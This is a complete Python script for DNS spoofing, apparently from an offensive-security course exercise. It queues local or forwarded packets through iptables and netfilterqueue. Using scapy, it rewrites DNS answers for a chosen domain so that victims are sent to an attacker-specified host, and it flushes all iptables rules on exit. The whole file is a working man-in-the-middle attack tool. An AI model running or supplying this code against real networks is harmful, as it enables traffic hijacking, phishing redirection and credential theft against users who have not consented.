#!/usr/bin/env python3

import argparse
import subprocess

import netfilterqueue
import kamene.all as scapy


def get_arguments():
    """
    Return the arguments:
    - traffic: Spoof traffic on the [local] machine or [remote] machine
    - domain: Which domain to spoof traffic for
    - queue: The queue number to capture packets for
    """

    # Create parser
    parser = argparse.ArgumentParser()
    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
    parser.add_argument("domain", help="Provide a domain to spoof and respond with")
    parser.add_argument("host", help="Host address to redirect user to")
    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
                        help="Provide the queue number to capture packets for")

    # Parse args
    arguments = parser.parse_args()
    return arguments


def queue_local_traffic(queue_number):
    """Capture local traffic to the queue"""
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def queue_remote_traffic(queue_number):
    """Capture remote traffic to the queue"""
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def reset_ip_tables():
    """Reset IP tables"""
    subprocess.run(["iptables", "--flush"], check=True)


class DNSSpoofer:
    """
    DNS Spoofer

    This class accepts the domain to spoof the DNS address for as well
    as the host to redirect the victim to.

    The process_packet method is the callback function to the NFQ.
    """

    def __init__(self, domain, host):
        self.domain = domain
        self.host = host

    def process_packet(self, packet):
        try:
            # Convert scapy_packet
            scapy_packet = scapy.IP(packet.get_payload())

            # Check if the packet has a DNS Response layer
            if scapy_packet.haslayer(scapy.DNSRR):

                # Capture the DNS request qname
                qname = scapy_packet[scapy.DNSQR].qname
                if self.domain.encode() in qname:
                    print(f"[+] Captured Traffic! Spoofing {scapy_packet[scapy.IP].src} to {self.host}.")

                    # Remove all other answers and save the spoofed answer
                    answer = scapy.DNSRR(rrname=qname, rdata=self.host)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    # Delete IP/UDP fields so they can be recalculated by scapy
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    # Set the new payload
                    packet.set_payload(bytes(scapy_packet))
        except Exception as e:
            print(f"[-] Error processing packet: {str(e)}")
        finally:
            # Forward off the packet through the queue
            packet.accept()


def main(args):
    traffic = args.traffic
    domain = args.domain
    host = args.host
    queue_number = args.queue

    queue = None
    try:
        if traffic == "local":
            queue_local_traffic(queue_number)
            print(f"[+] Capturing local traffic in Queue {queue_number}.")
        elif traffic == "remote":
            queue_remote_traffic(queue_number)
            print(f"[+] Capturing remote traffic in Queue {queue_number}.")

        # Initialize DNS Spoofer instance with variable content
        dns_spoofer = DNSSpoofer(domain, host)

        # Bind queue
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(queue_number, dns_spoofer.process_packet)

        print(f"[+] Successfully binded to Queue {queue_number}")
        queue.run()

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
    except Exception as e:
        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
    finally:
        if queue:
            queue.unbind()
        reset_ip_tables()


if __name__ == "__main__":
    args = get_arguments()
    main(args)
